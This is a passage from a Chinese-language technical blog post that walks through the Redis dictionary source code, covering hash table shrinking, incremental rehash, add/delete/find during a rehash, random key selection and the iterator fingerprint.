<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASHTABLE_MIN_FILL 10      <span class="comment">/* Minimal hash table fill 10% */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dictSlots(d) ((d)-&gt;ht[0].size+(d)-&gt;ht[1].size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dictSize(d) ((d)-&gt;ht[0].used+(d)-&gt;ht[1].used)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">htNeedsResize</span><span class="params">(dict *dict)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size, used;</span><br><span class="line">    size = dictSlots(dict);</span><br><span class="line">    used = dictSize(dict);</span><br><span class="line">    <span class="keyword">return</span> (size &gt; DICT_HT_INITIAL_SIZE &amp;&amp;		</span><br><span class="line">            (used*<span class="number">100</span>/size &lt; HASHTABLE_MIN_FILL));	<span class="comment">// 负载因子小于0.1，表示需要收缩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哈希表收缩的实现参考源码<code>dictResize</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DICT_HT_INITIAL_SIZE 4</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dictResize</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> minimal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dict_can_resize || dictIsRehashing(d)) <span class="keyword">return</span> DICT_ERR;</span><br><span class="line">    minimal = d-&gt;ht[<span class="number">0</span>].used;			<span class="comment">// 收缩后的哈希表大小为max(ht[0].used, 4)</span></span><br><span class="line">    <span class="keyword">if</span> (minimal &lt; DICT_HT_INITIAL_SIZE)</span><br><span class="line">        minimal = DICT_HT_INITIAL_SIZE;</span><br><span class="line">    <span class="keyword">return</span> dictExpand(d, minimal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定时事件中判断每个数据库键空间字典是否需要收缩，参考源码<code>databasesCron</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">databasesCron</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="comment">// ....</span></span><br><span class="line">	<span class="keyword">if</span> (!hasActiveChildProcess()) &#123;	<span class="comment">// 如果没有执行bgsave, bgwriteaof</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            tryResizeHashTables(resize_db % server.dbnum); <span class="comment">// 尝试对每个数据库键空间字典和过期字典做哈希表收缩</span></span><br><span class="line">            resize_db++;</span><br><span class="line">        &#125;		</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tryResizeHashTables</span><span class="params">(<span class="type">int</span> dbid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (htNeedsResize(server.db[dbid].dict))</span><br><span class="line">        dictResize(server.db[dbid].dict);</span><br><span class="line">    <span class="keyword">if</span> (htNeedsResize(server.db[dbid].expires))</span><br><span class="line">        dictResize(server.db[dbid].expires);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3><span id="渐进式rehash">渐进式rehash<span id="jump16"></span></span></h3><h4><span id="为什么需要渐进式rehash">为什么需要渐进式rehash<span id="jump17"></span></span></h4><p>考虑一个很大的字典（比如有1亿个key），当扩展或收缩哈希表时，需要将ht[0]中所有键值对rehash到ht[1]，这个计算量是非常庞大的，对Redis服务器性能有一定影响，甚至会导致服务器在一段时间内停止服务。</p>
<p>因此，Redis服务器并不是一次性将ht[0]键值对全部rehash到ht[1]，而是分多次地，渐进式地完成rehash动作。</p>
<h4><span id="渐进式rehash的步骤">渐进式rehash的步骤<span id="jump18"></span></span></h4><ul>
<li><p>为ht[1]分配空间，并设置字典的rehashIdx为0，表示rehash从ht[0]的第0号链表开始。</p>
</li>
<li><p>每执行一次字典的增、删、改、查操作时，Redis调用一次<code>_dictRehashStep</code>，将ht[0]哈希表在rehashIdx索引上的所有键值对rehash到ht[1]，rehash完成后将rehashIdx加1</p>
</li>
<li><p>当ht[0]所有键值对都rehash到ht[1]后，将rehashIdx置为-1，表示rehash完成。</p>
</li>
<li><p>另外，Redis服务器的定时任务中，会周期性地调用<code>dictRehashMilliseconds</code>方法，在指定毫秒事件内对字典进行主动的rehash。</p>
</li>
</ul>
<p>可以看出，渐进式rehash采用分治思想，将rehash计算量平摊到对字典的增、删、改、查操作上，避免了一次性rehash的庞大计算量。</p>
<p><strong>rehash源码分析：</strong></p>
<p>1、通过<code>_dictRehashStep</code>执行一次单步的rehash，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _dictRehashStep(dict *d) &#123;</span><br><span class="line">    <span class="keyword">if</span> (d-&gt;iterators == <span class="number">0</span>) dictRehash(d,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Performs N steps of incremental rehashing. Returns 1 if there are still</span></span><br><span class="line"><span class="comment"> * keys to move from the old to the new hash table, otherwise 0 is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that a rehashing step consists in moving a bucket (that may have more</span></span><br><span class="line"><span class="comment"> * than one key as we use chaining) from the old to the new hash table, however</span></span><br><span class="line"><span class="comment"> * since part of the hash table may be composed of empty spaces, it is not</span></span><br><span class="line"><span class="comment"> * guaranteed that this function will rehash even a single bucket, since it</span></span><br><span class="line"><span class="comment"> * will visit at max N*10 empty buckets in total, otherwise the amount of</span></span><br><span class="line"><span class="comment"> * work it does would be unbound and the function may block for a long time. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dictRehash</span><span class="params">(dict *d, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> empty_visits = n*<span class="number">10</span>; <span class="comment">/* Max number of empty buckets to visit. */</span></span><br><span class="line">    <span class="keyword">if</span> (!dictIsRehashing(d)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(n-- &amp;&amp; d-&gt;ht[<span class="number">0</span>].used != <span class="number">0</span>) &#123;</span><br><span class="line">        dictEntry *de, *nextde;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Note that rehashidx can&#x27;t overflow as we are sure there are more</span></span><br><span class="line"><span class="comment">         * elements because ht[0].used != 0 */</span></span><br><span class="line">        assert(d-&gt;ht[<span class="number">0</span>].size &gt; (<span class="type">unsigned</span> <span class="type">long</span>)d-&gt;rehashidx);</span><br><span class="line">        <span class="keyword">while</span>(d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            d-&gt;rehashidx++;</span><br><span class="line">            <span class="keyword">if</span> (--empty_visits == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        de = d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx];</span><br><span class="line">        <span class="comment">/* Move all the keys in this bucket from the old to the new hash HT */</span></span><br><span class="line">        <span class="keyword">while</span>(de) &#123;</span><br><span class="line">            <span class="type">uint64_t</span> h;</span><br><span class="line"></span><br><span class="line">            nextde = de-&gt;next;</span><br><span class="line">            <span class="comment">/* Get the index in the new hash table */</span></span><br><span class="line">            h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[<span class="number">1</span>].sizemask;</span><br><span class="line">            de-&gt;next = d-&gt;ht[<span class="number">1</span>].table[h];</span><br><span class="line">            d-&gt;ht[<span class="number">1</span>].table[h] = de;</span><br><span class="line">            d-&gt;ht[<span class="number">0</span>].used--;</span><br><span class="line">            d-&gt;ht[<span class="number">1</span>].used++;</span><br><span class="line">            de = nextde;</span><br><span class="line">        &#125;</span><br><span class="line">        d-&gt;ht[<span class="number">0</span>].table[d-&gt;rehashidx] = <span class="literal">NULL</span>;</span><br><span class="line">        d-&gt;rehashidx++;											<span class="comment">// rehash完成后，将rehashidx计数加1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if we already rehashed the whole table... */</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used == <span class="number">0</span>) &#123;</span><br><span class="line">        zfree(d-&gt;ht[<span class="number">0</span>].table);</span><br><span class="line">        d-&gt;ht[<span class="number">0</span>] = d-&gt;ht[<span class="number">1</span>];</span><br><span class="line">        _dictReset(&amp;d-&gt;ht[<span class="number">1</span>]);</span><br><span class="line">        d-&gt;rehashidx = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* More to rehash... */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Q：为什么要设置单步rehash中最大空桶访问次数限制(<code>empty_visit</code>)？ </p>
<p>A：考虑一个非常大的哈希表，比如有10亿个key, 其中连续1亿个空桶。如果不设置这个限制，会导致rehash中遍历空桶耗时太多，出现服务器阻塞。</p>
<p>2、通过定时任务中，周期性调用<code>dictRehashMilliseconds</code>，对字典执行主动rehash</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">timeInMilliseconds</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"></span><br><span class="line">    gettimeofday(&amp;tv,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> (((<span class="type">long</span> <span class="type">long</span>)tv.tv_sec)*<span class="number">1000</span>)+(tv.tv_usec/<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Rehash in ms+&quot;delta&quot; milliseconds. The value of &quot;delta&quot; is larger </span></span><br><span class="line"><span class="comment"> * than 0, and is smaller than 1 in most cases. The exact upper bound </span></span><br><span class="line"><span class="comment"> * depends on the running time of dictRehash(d,100).*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dictRehashMilliseconds</span><span class="params">(dict *d, <span class="type">int</span> ms)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> start = timeInMilliseconds();</span><br><span class="line">    <span class="type">int</span> rehashes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(dictRehash(d,<span class="number">100</span>)) &#123;</span><br><span class="line">        rehashes += <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">if</span> (timeInMilliseconds()-start &gt; ms) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rehashes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现细节分析：</p>
<ul>
<li><p>通过C语言库函数<code>gettimeofday</code>计算rehash前后的耗时，好处是跨平台，且时间精度可以达到微秒级。</p>
</li>
<li><p>通过循环多次执行一个短任务，每次比较实际用时与规定用时的方式，近似地实现规定时间内执行某个任务的目的。这种实现技巧简化了代码逻辑，值得学习借鉴。</p>
</li>
</ul>
<h4><span id="增-删-改-查场景中的rehash实现">增、删、改、查场景中的rehash实现<span id="jump19"></span></span></h4><p>在rehash过程中，字典会同时使用ht[0], ht[1]两个哈希表，此时字典的增、删、改、查操作也会同时在两个字典中进行。</p>
<ul>
<li><p>查 —— 依次在ht[0], ht[1]中查找。</p>
</li>
<li><p>增 —— 新增的键值对总是只加入到ht[1]，目的是保证ht[0]中键值对只减不增，加速rehash的执行。</p>
</li>
<li><p>删 —— 依次在ht[0], ht[1]中查找节点，并删除。</p>
</li>
</ul>
<p><strong>源码分析：</strong></p>
<p>1、<code>dictAdd</code> 将给定键值对添加到字典，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dictAdd</span><span class="params">(dict *d, <span class="type">void</span> *key, <span class="type">void</span> *val)</span> &#123;</span><br><span class="line">    dictEntry *entry = dictAddRaw(d,key,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!entry) <span class="keyword">return</span> DICT_ERR;</span><br><span class="line">    dictSetVal(d, entry, val);</span><br><span class="line">    <span class="keyword">return</span> DICT_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dictEntry *<span class="title function_">dictAddRaw</span><span class="params">(dict *d, <span class="type">void</span> *key, dictEntry **existing)</span> &#123;</span><br><span class="line">    <span class="type">long</span> index;</span><br><span class="line">    dictEntry *entry;</span><br><span class="line">    dictht *ht;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d);	<span class="comment">// 执行一次rehash</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 计算哈希索引值</span></span><br><span class="line">    <span class="keyword">if</span> ((index = _dictKeyIndex(d, key, dictHashKey(d,key), existing)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate the memory and store the new entry.</span></span><br><span class="line"><span class="comment">     * Insert the element in top, with the assumption that in a database</span></span><br><span class="line"><span class="comment">     * system it is more likely that recently added entries are accessed</span></span><br><span class="line"><span class="comment">     * more frequently. </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ht = dictIsRehashing(d) ? &amp;d-&gt;ht[<span class="number">1</span>] : &amp;d-&gt;ht[<span class="number">0</span>]; <span class="comment">// rehash中，新增的键值对加入ht[1]</span></span><br><span class="line">    entry = zmalloc(<span class="keyword">sizeof</span>(*entry));</span><br><span class="line">    entry-&gt;next = ht-&gt;table[index];	 <span class="comment">// 头插法，理由是最先插入的节点被频繁访问的可能性越大</span></span><br><span class="line">    ht-&gt;table[index] = entry;</span><br><span class="line">    ht-&gt;used++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the hash entry fields. */</span></span><br><span class="line">    dictSetKey(d, entry, key);</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li><p>每执行一次字典的插入操作，都会调用一次<code>_dictRehashStep</code>，做一次rehash</p>
</li>
<li><p>rehash过程中，新增的键值对总是加入到ht[1]，<code>ht = dictIsRehashing(d) ? &amp;d-&gt;ht[1] : &amp;d-&gt;ht[0];</code></p>
</li>
<li><p>使用头插法，理由是最先插入的节点后续被访问的可能性越大，而且实现也非常简单，节省内存。</p>
</li>
</ul>
<p>2、<code>dictDelete</code>从字典中删除给定键的键值对，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dictDelete</span><span class="params">(dict *ht, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dictGenericDelete(ht,key,<span class="number">0</span>) ? DICT_OK : DICT_ERR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> dictEntry *<span class="title function_">dictGenericDelete</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">int</span> nofree)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> h, idx;</span><br><span class="line">    dictEntry *he, *prevHe;</span><br><span class="line">    <span class="type">int</span> table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used == <span class="number">0</span> &amp;&amp; d-&gt;ht[<span class="number">1</span>].used == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;	<span class="comment">// 表空不能删除，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d);	<span class="comment">// 执行一次rehash</span></span><br><span class="line">    h = dictHashKey(d, key);	<span class="comment">// 计算哈希值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (table = <span class="number">0</span>; table &lt;= <span class="number">1</span>; table++) &#123;	<span class="comment">// 删除操作同时使用ht[0], ht[1]两张表</span></span><br><span class="line">        idx = h &amp; d-&gt;ht[table].sizemask;	<span class="comment">// 计算索引值</span></span><br><span class="line">        he = d-&gt;ht[table].table[idx];</span><br><span class="line">        prevHe = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(he) &#123;</span><br><span class="line">            <span class="keyword">if</span> (key==he-&gt;key || dictCompareKeys(d, key, he-&gt;key)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (prevHe)</span><br><span class="line">                    prevHe-&gt;next = he-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    d-&gt;ht[table].table[idx] = he-&gt;next;</span><br><span class="line">                <span class="keyword">if</span> (!nofree) &#123;</span><br><span class="line">                    dictFreeKey(d, he);</span><br><span class="line">                    dictFreeVal(d, he);</span><br><span class="line">                    zfree(he);</span><br><span class="line">                &#125;</span><br><span class="line">                d-&gt;ht[table].used--;</span><br><span class="line">                <span class="keyword">return</span> he;</span><br><span class="line">            &#125;</span><br><span class="line">            prevHe = he;</span><br><span class="line">            he = he-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!dictIsRehashing(d)) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">/* not found */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li>每执行一次字典的删除操作，都会调用一次<code>_dictRehashStep</code>，做一次rehash</li>
<li>删除操作同时使用ht[0], ht[1]两张表</li>
</ul>
<p>3、<code>dictFetchValue</code>用于查找字典，返回给定键的值，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">dictFetchValue</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    dictEntry *he;</span><br><span class="line">    he = dictFind(d,key);</span><br><span class="line">    <span class="keyword">return</span> he ? dictGetVal(he) : <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dictEntry *<span class="title function_">dictFind</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    dictEntry *he;</span><br><span class="line">    <span class="type">uint64_t</span> h, idx, table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictSize(d) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d); <span class="comment">// 执行一次rehash</span></span><br><span class="line">    h = dictHashKey(d, key);</span><br><span class="line">    <span class="keyword">for</span> (table = <span class="number">0</span>; table &lt;= <span class="number">1</span>; table++) &#123; 		<span class="comment">// 查询操作同时使用ht[0], ht[1]两张表</span></span><br><span class="line">        idx = h &amp; d-&gt;ht[table].sizemask;</span><br><span class="line">        he = d-&gt;ht[table].table[idx];</span><br><span class="line">        <span class="keyword">while</span>(he) &#123;</span><br><span class="line">            <span class="keyword">if</span> (key==he-&gt;key || dictCompareKeys(d, key, he-&gt;key))</span><br><span class="line">                <span class="keyword">return</span> he;</span><br><span class="line">            he = he-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!dictIsRehashing(d)) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li>每执行一次字典的查询操作，都会调用一次<code>_dictRehashStep</code>，做一次rehash</li>
<li>查询操作同时使用ht[0], ht[1]两张表</li>
</ul>
<h3><span id="字典api">字典API<span id="jump20"></span></span></h3><table>
<thead>
<tr>
<th>API</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>dictCreate</td>
<td>创建字典</td>
</tr>
<tr>
<td>dictRelease</td>
<td>释放字典</td>
</tr>
<tr>
<td>dictAdd</td>
<td>新增一个键值对到字典</td>
</tr>
<tr>
<td>dictFetchValue</td>
<td>查找字典，返回给定键的值</td>
</tr>
<tr>
<td>dictDelete</td>
<td>从字典中删除给定键的键值对</td>
</tr>
</tbody></table>
<h4><span id="随机返回一个键值对">随机返回一个键值对<span id="jump21"></span></span></h4><p>源码参考<code>dictGetRandomKey</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dictEntry *<span class="title function_">dictGetRandomKey</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    dictEntry *he, *orighe;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> h;</span><br><span class="line">    <span class="type">int</span> listlen, listele;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictSize(d) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d);</span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">/* We are sure there are no elements in indexes from 0</span></span><br><span class="line"><span class="comment">             * to rehashidx-1 */</span></span><br><span class="line">            h = d-&gt;rehashidx + (random() % (d-&gt;ht[<span class="number">0</span>].size +</span><br><span class="line">                                            d-&gt;ht[<span class="number">1</span>].size -</span><br><span class="line">                                            d-&gt;rehashidx));</span><br><span class="line">            he = (h &gt;= d-&gt;ht[<span class="number">0</span>].size) ? d-&gt;ht[<span class="number">1</span>].table[h - d-&gt;ht[<span class="number">0</span>].size] :</span><br><span class="line">                                      d-&gt;ht[<span class="number">0</span>].table[h];</span><br><span class="line">        &#125; <span class="keyword">while</span>(he == <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            h = random() &amp; d-&gt;ht[<span class="number">0</span>].sizemask;</span><br><span class="line">            he = d-&gt;ht[<span class="number">0</span>].table[h];</span><br><span class="line">        &#125; <span class="keyword">while</span>(he == <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now we found a non empty bucket, but it is a linked</span></span><br><span class="line"><span class="comment">     * list and we need to get a random element from the list.</span></span><br><span class="line"><span class="comment">     * The only sane way to do so is counting the elements and</span></span><br><span class="line"><span class="comment">     * select a random index. */</span></span><br><span class="line">    listlen = <span class="number">0</span>;</span><br><span class="line">    orighe = he;</span><br><span class="line">    <span class="keyword">while</span>(he) &#123;</span><br><span class="line">        he = he-&gt;next;</span><br><span class="line">        listlen++;</span><br><span class="line">    &#125;</span><br><span class="line">    listele = random() % listlen;</span><br><span class="line">    he = orighe;</span><br><span class="line">    <span class="keyword">while</span>(listele--) he = he-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> he;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li><p>实现思路是：先随机选取一个非空的桶，再随机选取链表中的一个节点。</p>
</li>
<li><p>理想情况下，哈希表中的每个链表的长度为1，所以这里用O(N)复杂度随机获取链表节点是完全可以接受的，不记录链表长度目的是为了节省内存。</p>
</li>
</ul>
<h4><span id="字典迭代器的实现">字典迭代器的实现<span id="jump22"></span></span></h4><h5><span id="1-先看下字典迭代器的结构体定义">1、先看下字典迭代器的结构体定义</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* If safe is set to 1 this is a safe iterator, that means, you can call</span></span><br><span class="line"><span class="comment"> * dictAdd, dictFind, and other functions against the dictionary even while</span></span><br><span class="line"><span class="comment"> * iterating. Otherwise it is a non safe iterator, and only dictNext()</span></span><br><span class="line"><span class="comment"> * should be called while iterating. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictIterator</span> &#123;</span></span><br><span class="line">    dict *d;</span><br><span class="line">    <span class="type">long</span> index;						<span class="comment">// 当前遍历到的哈希表中的索引值</span></span><br><span class="line">    <span class="type">int</span> table;						<span class="comment">// 取值只能是0或1</span></span><br><span class="line">    <span class="type">int</span> safe;						<span class="comment">// 表示这个迭代器是否是安全的，1表示安全，0表示不安全</span></span><br><span class="line">    dictEntry *entry, *nextEntry;	<span class="comment">// 迭代器指向的当前元素，以及下一个要遍历的元素</span></span><br><span class="line">    <span class="comment">/* unsafe iterator fingerprint for misuse detection. */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fingerprint;			<span class="comment">// 字典的指纹</span></span><br><span class="line">&#125; dictIterator;</span><br></pre></td></tr></table></figure>

<p>1、safe成员为1，表示这个迭代器是安全的。安全指的是遍历过程中允许对字典做修改操作，且迭代中不会出现元素重复。所以当字典绑定了安全迭代器时，Redis不允许出现rehash操作，源码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _dictRehashStep(dict *d) &#123;</span><br><span class="line">    <span class="keyword">if</span> (d-&gt;iterators == <span class="number">0</span>) dictRehash(d,<span class="number">1</span>);	<span class="comment">// 只有未绑定安全迭代器时，才执行dictRehash</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>safe成员为0，表示这个迭代器是不安全的。不安全指的是遍历过程中不允许修改这个字典，且遍历过程中可能出现重复元素。它的优点在于允许rehash。</p>
<p>2、fingerprint为字典的指纹，在首次迭代时生成指纹，销毁迭代器时比较指纹，如果两者不一致，说明出现异常，程序退出。源码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dictReleaseIterator</span><span class="params">(dictIterator *iter)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(iter-&gt;index == <span class="number">-1</span> &amp;&amp; iter-&gt;table == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;safe)</span><br><span class="line">            iter-&gt;d-&gt;iterators--;		<span class="comment">// 计数减1，允许rehash操作</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            assert(iter-&gt;fingerprint == dictFingerprint(iter-&gt;d));	<span class="comment">// 比较指纹</span></span><br><span class="line">    &#125;</span><br><span class="line">    zfree(iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>指纹的生成方法参考<code>dictFingerprint</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">dictFingerprint</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> integers[<span class="number">6</span>], hash = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">    integers[<span class="number">0</span>] = (<span class="type">long</span>) d-&gt;ht[<span class="number">0</span>].table;</span><br><span class="line">    integers[<span class="number">1</span>] = d-&gt;ht[<span class="number">0</span>].size;</span><br><span class="line">    integers[<span class="number">2</span>] = d-&gt;ht[<span class="number">0</span>].used;</span><br><span class="line">    integers[<span class="number">3</span>] = (<span class="type">long</span>) d-&gt;ht[<span class="number">1</span>].table;</span><br><span class="line">    integers[<span class="number">4</span>] = d-&gt;ht[<span class="number">1</span>].size;</span><br><span class="line">    integers[<span class="number">5</span>] = d-&gt;ht[<span class="number">1</span>].used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We hash N integers by summing every successive integer with the integer</span></span><br><span class="line"><span class="comment">     * hashing of the previous sum. Basically:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Result = hash(hash(hash(int1)+int2)+int3) ...</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * This way the same set of integers in a different order will (likely) hash</span></span><br><span class="line"><span class="comment">     * to a different number. */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        hash += integers[j];</span><br><span class="line">        <span class="comment">/* For the hashing step we use Tomas Wang&#x27;s 64 bit integer hash. */</span></span><br><span class="line">        hash = (~hash) + (hash &lt;&lt; <span class="number">21</span>); <span class="comment">// hash = (hash &lt;&lt; 21) - hash - 1;</span></span><br><span class="line">        hash = hash ^ (hash &gt;&gt; <span class="number">24</span>);</span><br><span class="line">        hash = (hash + (hash &lt;&lt; <span class="number">3</span>)) + (hash &lt;&lt; <span class="number">8</span>); <span class="comment">// hash * 265</span></span><br><span class="line">        hash = hash ^ (hash &gt;&gt; <span class="number">14</span>);</span><br><span class="line">        hash = (hash + (hash &lt;&lt; <span class="number">2</span>)) + (hash &lt;&lt; <span class="number">4</span>); <span class="comment">// hash * 21</span></span><br><span class="line">        hash = hash ^ (hash &gt;&gt; <span class="number">28</span>);</span><br><span class="line">        hash = hash + (hash &lt;&lt; <span class="number">31</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



